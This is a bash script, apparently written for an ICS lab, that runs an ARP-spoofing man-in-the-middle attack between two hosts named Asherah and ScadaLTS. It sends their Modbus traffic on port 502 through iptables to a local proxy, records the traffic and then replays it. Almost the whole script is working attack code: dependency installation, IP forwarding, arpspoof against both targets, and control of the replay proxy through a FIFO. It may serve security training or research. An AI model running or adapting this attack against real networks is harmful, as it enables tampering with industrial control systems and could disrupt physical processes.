#!/bin/bash

# Configuration
ASHERAH_IP="10.100.2.254"
SCADA_IP="10.100.2.10"
INTERFACE="eth0"
PROXY_PORT="5502"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}"
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║         ARP MITM SIMPLE - arpspoof + proxy Modbus                    ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check for root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED} This script must be run as root!${NC}"
    echo "   Use: sudo $0"
    exit 1
fi

# Check dependencies
declare -A cmd_pkg=(
    [arpspoof]="dsniff"
    [ps]="procps"
    [python3]="python3"
    [netstat]="net-tools"
    [iptables]="iptables"
    [pymodbus]="python3-pymodbus"
)

missing=()
for cmd in "${!cmd_pkg[@]}"; do
    if ! command -v "$cmd" &>/dev/null; then
        pkg=${cmd_pkg[$cmd]}
        [[ " ${missing[*]} " == *" ${pkg} "* ]] || missing+=("$pkg")
    fi
done

if [ ${#missing[@]} -gt 0 ]; then
    echo -e "${YELLOW} Missing packages: ${missing[*]}${NC}"
    if command -v apt &>/dev/null; then
        echo -e "${YELLOW}Installing missing packages (apt)...${NC}"
        apt update && apt install -y "${missing[@]}"
    elif command -v apt-get &>/dev/null; then
        echo -e "${YELLOW}Installing missing packages (apt-get)...${NC}"
        apt-get update && apt-get install -y "${missing[@]}"
    else
        echo -e "${RED} No apt/apt-get found - please install: ${missing[*]}${NC}"
        exit 1
    fi
fi


# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Stopping attack and cleaning up...${NC}"
    
    # Kill arpspoof processes
    echo "[*] Stopping arpspoof processes..."
    pkill -f "arpspoof.*$ASHERAH_IP"
    pkill -f "arpspoof.*$SCADA_IP"
    
    # Remove iptables rules
    echo "[*] Removing iptables rules..."
    iptables -t nat -D PREROUTING -p tcp --dport 502 -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    iptables -D FORWARD -j ACCEPT 2>/dev/null
    
    # Disable IP forwarding
    echo "[*] Disabling IP forwarding..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Stop the Modbus proxy
    echo "[*] Stopping Modbus proxy..."
    pkill -f "python3.*mitm_replay_attack.py"
    
    echo -e "${GREEN} Cleanup complete - Network restored${NC}\n"
    exit 0
}

# Trap for clean exit
trap cleanup INT TERM

echo -e "${YELLOW}[1/6] Checking prerequisites...${NC}"

# Verify the Modbus proxy script exists
if [ ! -f "mitm_replay_attack.py" ]; then
    echo -e "${RED} mitm_replay_attack.py not found!${NC}"
    echo "   Make sure you're in the scripts directory"
    exit 1
fi

echo -e "${GREEN} Prerequisites OK${NC}"

echo -e "\n${YELLOW}[2/6] Configuring network...${NC}"

# Ensure IP forwarding is enabled
current=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo 0)
if [ "$current" -eq 1 ]; then
    echo -e "${GREEN} IP forwarding already enabled${NC}"
else
    echo -e "${YELLOW}Enabling IP forwarding...${NC}"
    if command -v sysctl >/dev/null 2>&1; then
        sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
    else
        echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || {
            echo -e "${RED} Failed to enable IP forwarding${NC}"
            cleanup
        }
    fi

    # verify
    if [ "$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo 0)" -eq 1 ]; then
        echo -e "${GREEN} IP forwarding enabled${NC}"
    else
        echo -e "${RED} Could not enable IP forwarding${NC}"
        cleanup
    fi
fi

# Configure iptables to redirect Modbus traffic to the proxy
iptables -t nat -A PREROUTING -p tcp --dport 502 -j REDIRECT --to-port $PROXY_PORT
iptables -A FORWARD -j ACCEPT
echo -e "${GREEN} iptables rules configured (redirect port 502 -> $PROXY_PORT)${NC}"

echo -e "\n${YELLOW}[3/6] Starting Modbus proxy on port $PROXY_PORT...${NC}"

FIFO="/tmp/mitm_input"

# Remove existing FIFO and create a new one
rm -f "$FIFO"
mkfifo "$FIFO"

# Start the Modbus proxy in background (connected to FIFO for control)
tail -f "$FIFO" | python3 mitm_replay_attack.py --interactive --mode passthrough > /root/logs/proxy.log 2>&1 &
PROXY_PID=$!

# Wait for the proxy to start
sleep 3

# Verify proxy is running
if ps -p $PROXY_PID > /dev/null; then
    echo -e "${GREEN} Modbus proxy started (PID: $PROXY_PID)${NC}"
else
    echo -e "${RED} Proxy failed to start! Check /root/logs/proxy.log${NC}"
    cleanup
fi

echo -e "\n${YELLOW}[4/6] Starting ARP spoofing...${NC}"

# ARP spoof Asherah (lui faire croire que nous sommes ScadaLTS)
arpspoof -i $INTERFACE -t $ASHERAH_IP $SCADA_IP > /dev/null 2>&1 &
ARPSPOOF_PID1=$!
echo -e "${GREEN} Spoofing Asherah (telling it we are ScadaLTS)${NC}"

# ARP spoof ScadaLTS (lui faire croire que nous sommes Asherah)
arpspoof -i $INTERFACE -t $SCADA_IP $ASHERAH_IP > /dev/null 2>&1 &
ARPSPOOF_PID2=$!
echo -e "${GREEN} Spoofing ScadaLTS (telling it we are Asherah)${NC}"

# Wait for ARP poisoning to take effect
sleep 5

echo -e "\n${YELLOW}[5/6] Verifying MITM setup...${NC}"

# Verify if arpspoof processes are running
if ps -p $ARPSPOOF_PID1 > /dev/null && ps -p $ARPSPOOF_PID2 > /dev/null; then
    echo -e "${GREEN} ARP spoofing active${NC}"
else
    echo -e "${RED} ARP spoofing failed!${NC}"
    cleanup
fi

if netstat -tuln | grep -q ":$PROXY_PORT"; then
    echo -e "${GREEN} Proxy listening on port $PROXY_PORT${NC}"
else
    echo -e "${RED} Proxy not listening!${NC}"
    cleanup
fi

echo "[INFO] Switching mitm to RECORD mode"
echo "record" > "$FIFO"

sleep 15

echo "[INFO] Stopping recording"
echo "stop" > "$FIFO"

sleep 3

echo "[INFO] Switching to replay mode"
echo "replay" > "$FIFO"



echo -e "\n${GREEN}[6/6] MITM ACTIVE!${NC}"

# Monitoring loop
echo "Monitoring traffic (press Ctrl+C to stop)..."
echo "────────────────────────────────────────────────────────────────────────"

python3 monitoring_realtime.py